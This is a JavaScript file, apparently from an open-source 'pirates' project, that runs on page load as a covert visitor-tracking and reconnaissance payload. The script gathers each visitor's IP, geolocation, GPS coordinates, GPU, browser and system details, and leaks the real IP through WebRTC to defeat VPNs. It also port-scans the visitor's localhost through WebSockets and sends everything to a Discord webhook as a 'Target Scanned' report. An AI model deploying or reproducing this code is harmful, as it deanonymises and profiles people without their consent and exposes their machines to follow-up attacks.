// Congrats on using F12. It's too late but don't worry - we're the good guys.
//
// Follow the Discord link to join us.
// This project is open source and can be found at https://github.com/RocketGod-git/thepiratesplunder 
//
// __________                  __             __     ________             .___ 
// \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
//  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
//  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
//  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
//         \/              \/      \/     \/               \/              \/  


async function main() {
    try {
        const response = await fetch('config.json');
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const config = await response.json();
        const webhook_url = config.webhook_url;

            // Extended Operating System Detection
            function detectOperatingSystem(userAgent) {
                if (userAgent.includes("Win")) {
                    if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
                    if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
                    if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
                    if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
                    if (userAgent.includes("Windows NT 6.0")) return "Windows Vista";
                    if (userAgent.includes("Windows NT 5.1")) return "Windows XP";
                    return "Windows (Other)";
                }
                if (userAgent.includes("Mac")) return "MacOS";
                if (userAgent.includes("X11")) return "UNIX";
                if (userAgent.includes("Linux")) return "Linux";
                if (userAgent.includes("Android")) return "Android";
                if (userAgent.includes("like Mac OS X")) {
                    if (userAgent.includes("iPhone")) return "iOS (iPhone)";
                    if (userAgent.includes("iPad")) return "iOS (iPad)";
                    return "iOS (Other)";
                }
                return "Unknown OS";
            }

            
            // Extended Browser Detection
            function detectBrowser(userAgent) {
                if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
                if (userAgent.includes("Seamonkey")) return "Seamonkey";
                if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
                if (userAgent.includes("Chromium")) return "Chromium";
                if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari";
                if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
                if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer";
                if (userAgent.includes("Edge")) return "Edge";
                return "Unknown Browser";
            }
    
            // Function to get operating system and browser details
            function getSystemDetails() {
                var userAgent = navigator.userAgent;
                var operatingSystem = detectOperatingSystem(userAgent);
                var browser = detectBrowser(userAgent);
    
                return {
                    operatingSystem,
                    browser
                };
            }

            
            // Function to get GPU details            
            function getGPUDetails() {
                return new Promise((resolve, reject) => {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        resolve({ vendor, renderer });
                    } else {
                        reject("WEBGL_debug_renderer_info extension not available");
                    }
                });
            }


            // Function for port scanning with WebSocket
            function checkPort(port) {
                return new Promise((resolve) => {
                    let ws;
                    const url = 'ws://localhost:' + port;
                    const timeout = setTimeout(() => {
                        if (ws) {
                            ws.close();
                        }
                        resolve({ port, isOpen: false }); // Port is closed or blocked
                    }, 2000); // Timeout in 2 seconds

                    try {
                        ws = new WebSocket(url);
                        ws.onopen = () => {
                            clearTimeout(timeout);
                            ws.close();
                            resolve({ port, isOpen: true }); // Port is open
                        };
                        ws.onerror = () => {
                            clearTimeout(timeout);
                            resolve({ port, isOpen: false }); // Port is closed or blocked
                        };
                    } catch (e) {
                        clearTimeout(timeout);
                        resolve({ port, isOpen: false }); // Handle any exception
                    }
                });
            }


            // Function to send the second webhook if GPS location is shared
            function sendLocationWebhook(ip, gpsText) {
                var embeds = [{
                    "title": "User Allowed Location Sharing",
                    "description": `IP Address: ${ip}\nGPS Location: ${gpsText}`,
                    "color": 65280 
                }];
            
                sendDiscordMessage(embeds);
            }
            

            //Main function for processing
            async function getLocationAndGPSData() {
                var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
                var messageSent = false; 
                var portsToCheck = [53, 80, 443, 995, 8080, 8081, 2222, 5001, 50000, 8443, 2086, 5555, 25565, 554, 1935, 21, 22, 23, 25, 110, 143, 3306, 3389, 5900, 55443, 10001];
            
                try {
                    const portResults = await Promise.allSettled(portsToCheck.map(port => checkPort(port)));

                    // Filter to only include open ports
                    const openPorts = portResults
                        .filter(result => result.status === 'fulfilled' && result.value.isOpen)
                        .map(result => result.value.port);
                    
                    console.log('Open ports:', openPorts);
            
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (!ipResponse.ok) {
                        throw new Error('Network response was not ok for IPify.');
                    }
                    const { ip } = await ipResponse.json();
            
                    const ipapiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    if (!ipapiResponse.ok) {
                        throw new Error('Network response was not ok for IPAPI.');
                    }
                    const location = await ipapiResponse.json();
            
                    const [vpnResult, webrtcResult, gpuDetails] = await Promise.all([
                        checkVPN(ip, userTimezone),
                        checkWebRTCLoak(),
                        getGPUDetails()
                    ]);
            
                    var systemDetails = getSystemDetails();
                    var screenResolution = `${window.screen.width}x${window.screen.height}`;
                    var referrer = document.referrer || "No referrer";
                    var language = navigator.language;
            
                    var locationValue = getLocationValue(location);
                    var gpsValue = location && location.latitude && location.longitude ? 
                                   `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : 
                                   "Location data not available";
            
                    var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
            
                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, openPorts);
                    messageSent = true; // Set the flag to true after sending the message
            
                    // Additional data send on geolocation permission
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function (position) {
                                var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                                var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;

                                // Call the function to send the new webhook
                                sendLocationWebhook(ip, gpsText);
                            },
                            function (error) {
                                console.error('Geolocation error:', error);
                            },
                            { timeout: 10000 }
                        );
                    }

                } catch (error) {
                    // Handle errors that occur within the try block
                    console.error('Error in getLocationAndGPSData:', error);
                }
            }                
            
            function getLocationValue(location) {
                if (location.region == null) {
                    return location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
                } else if (location.city == location.country_name) {
                    return location && location.city ? `${location.city}` : "Location data not available";
                } else {
                    return location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
                }
            }
            
            function checkVPN(ip, timezone) {
                return new Promise((resolve, reject) => {
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(data => {
                            if (data.error) {
                                console.error('Error with VPN check:', data.error);
                                resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + data.error });
                                return;
                            }
    
                            const ipTimezone = data.timezone;
                            const timezoneMatch = timezone === ipTimezone;
                            const vpnMessage = timezoneMatch
                                ? 'Timezones match'
                                : 'Timezones do not match (Possible VPN detected)';
                            resolve({ isVpn: !timezoneMatch, vpnMessage });
                        })
                        .catch(error => {
                            console.error('Error in VPN check:', error.message);
                            resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + error.message });
                        });
                });
            }
    
            //Sneak real IP with WebRTC
            function checkWebRTCLoak() {
                return new Promise(resolve => {
                    const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!rtcPeerConnection) {
                        resolve({ hasLeak: false, leakMessage: "WebRTC not supported" });
                        return;
                    }
    
                    const pc = new rtcPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(error => {
                            console.error("WebRTC Offer Error:", error);
                            resolve({ hasLeak: false, leakMessage: "Error in WebRTC offer: " + error.message });
                        });
    
                    pc.onicecandidate = ice => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            pc.close();
                            return;
                        }
    
                        const regexResult = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (regexResult && regexResult[1]) {
                            const myIP = regexResult[1];
                            pc.close();
                            resolve({ hasLeak: true, leakMessage: "WebRTC Leak Detected: " + myIP });
                        } else {
                            resolve({ hasLeak: false, leakMessage: "No WebRTC Leak Detected" });
                        }
                    };
    
    
                }).catch(error => {
                    console.error("Error in checkWebRTCLoak:", error);
                    return { hasLeak: false, leakMessage: "An error occurred in checkWebRTCLoak: " + error.message };
                });
            }
    
            //Error Handler
            function handleErrorType(errorCode, errorMessage, userTimezone) {
                let errorDescription;
    
                // Handling standard geolocation error codes
                switch (errorCode) {
                    case 1:
                        // Special handling for Permission Denied
                        sendDiscordEmbed(null, "Geolocation permission denied", null, null, null, null, null, null, null, userTimezone);
                        return;
                    case 2:
                        errorDescription = "Location information is unavailable.";
                        break;
                    case 3:
                        errorDescription = "The request to get user location timed out.";
                        break;
                    default:
                        // Handling custom 'unknown' error code
                        if (errorCode === 'unknown') {
                            errorDescription = "An unknown error occurred.";
                        } else {
                            errorDescription = "An error occurred. Error Code: " + errorCode;
                        }
                        break;
                }
    
                console.error(errorMessage || errorDescription);
    
                // Send error embed for cases other than Permission Denied
                if (errorCode !== 1) {
                    const errorEmbed = {
                        "title": "Error",
                        "color": 16711680, // Red color for error
                        "description": errorMessage || errorDescription
                    };
    
                    sendDiscordMessage([errorEmbed]);
                }
            }


            //More shennanigans
            function getAdditionalDetails() {
                var userAgent = navigator.userAgent;
                var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
                var browserVersion = userAgent.match(/(firefox|msie|chrome|safari|trident|opera)[\/\s](\d+)/i);
                browserVersion = browserVersion ? browserVersion[2] : 'Unknown';
                var connectionType = navigator.connection ? navigator.connection.type : 'Unknown';
                var doNotTrack = navigator.doNotTrack || 'Unknown';
    
                return {
                    deviceType,
                    browserVersion,
                    connectionType,
                    doNotTrack
                };
            }
    
    
            // Function to send message to Discord
            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue, openPorts) {
                var additionalDetails = getAdditionalDetails();
                var portStatusString = "No open ports detected";
            
                // Construct port status string based on open ports
                if (openPorts && openPorts.length > 0) {
                    portStatusString = openPorts
                        .map(port => `[Port ${port}](http://${_location_.ip}:${port})`)
                        .join('\n');
                }
            
                var embeds = [{
                    "title": "🎯 Target Scanned",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "📱 **Device Information**",
                            "value": `IP Address: [${_location_.ip ? _location_.ip : "Unknown"}](http://${_location_.ip})\nIP Address Location: ${gpsValue ? gpsValue : "Unknown"}\nTime Zone: ${userTimezone ? userTimezone : "Unknown"}\nTime Zone vs IP Location: ${vpnMessage ? vpnMessage : "Unknown"}`,
                            "inline": false
                        },
                        {
                            "name": "💾 **System Specifications**",
                            "value": `Device Type: ${additionalDetails.deviceType ? additionalDetails.deviceType : "Unknown"}\nOperating System: ${systemDetails.operatingSystem ? systemDetails.operatingSystem : "Unknown"}\nBrowser & Version: ${systemDetails.browser ? systemDetails.browser : 'Unknown'} ${additionalDetails.browserVersion ? additionalDetails.browserVersion : 'Unknown'}\nGPU: ${gpuValue ? gpuValue : "Unknown"}\nScreen Resolution: ${screenResolution ? screenResolution : "Unknown"}`,
                            "inline": false
                        },
                        {
                            "name": "🔒 **Security and Privacy**",
                            "value": `VPN Detection: ${isVpn ? "🛡️ VPN Detected" : "Unknown"}\nWebRTC Leak Status: ${webrtcResult ? webrtcResult : "Unknown"}\nPort Status: ${portStatusString ? portStatusString : "Unknown"}\nDo Not Track: ${additionalDetails.doNotTrack === '1' ? "On" : additionalDetails.doNotTrack === '0' ? "Off" : "Unknown"}`,
                            "inline": false
                        },
                        {
                            "name": "🔎 **Additional Details**",
                            "value": `Referrer: ${referrer ? referrer : "Unknown"}\nLanguage: ${language ? language : "Unknown"}\nConnection Type: ${additionalDetails.connectionType ? additionalDetails.connectionType : "Unknown"}`,
                            "inline": false
                        }
                    ]
                }];
                
                if (_location_.region === null){
                    if (embeds[0] && embeds[0].fields) { //overloaded once
                        for (let i = 0; i < embeds[0].fields.length; i++) {
                            if (embeds[0].fields[i].name === "Location") {
                                embeds[0].fields[i].value = `${_location_.city}, ${_location_.country_name}`;
                                break;
                            }
                        }
                    }
                }

                if(_location_.city == _location_.country_name){
                    if (embeds[0] && embeds[0].fields) { //overloaded once
                        for (let i = 0; i < embeds[0].fields.length; i++) {
                            if (embeds[0].fields[i].name === "Location") {
                                embeds[0].fields[i].value = `${_location_.city}`;
                                break;
                            }
                        }
                    }
                }
                
    
                sendDiscordMessage(embeds);
            }
    
    
            // Function to send data to the Discord webhook
            function sendDiscordMessage(embeds, retryCount = 3) {
                const maxRetries = 3;
                const retryDelay = 3000;
    
                fetch(webhook_url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: embeds })
                })
                    .then(response => {
                        if (!response.ok) {
                            console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
                            if (retryCount > 0) {
                                // Retry sending the webhook with exponential backoff
                                setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
                            } else {
                                console.error('Max retries reached. Giving up on sending message to Discord.');
                            }
                        } else {
                            console.log('Message sent successfully to Discord.');
                        }
                    })
                    .catch(error => {
                        console.error('Error sending message to Discord:', error);
                        if (retryCount > 0) {
                            // Retry sending the webhook with exponential backoff
                            setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
                        } else {
                            console.error('Max retries reached. Giving up on sending message to Discord.');
                        }
                    });
            }
    

            // Function to show the popup
            function showPopup() {
                var popup = document.getElementById('discordPopup');
                if (popup) {
                    popup.style.display = 'block';
                }
            }
    
            // Function to handle the acceptance of the invite
            function acceptInvite() {
                window.location.href = 'https://discord.gg/thepirates';
            }
    

            // Run these functions on page load
            await getLocationAndGPSData();
            setTimeout(showPopup, 3000);
            window.acceptInvite = acceptInvite;
    
        } catch (error) {
            console.error('Error occurred:', error);
        }
    }
    
    main();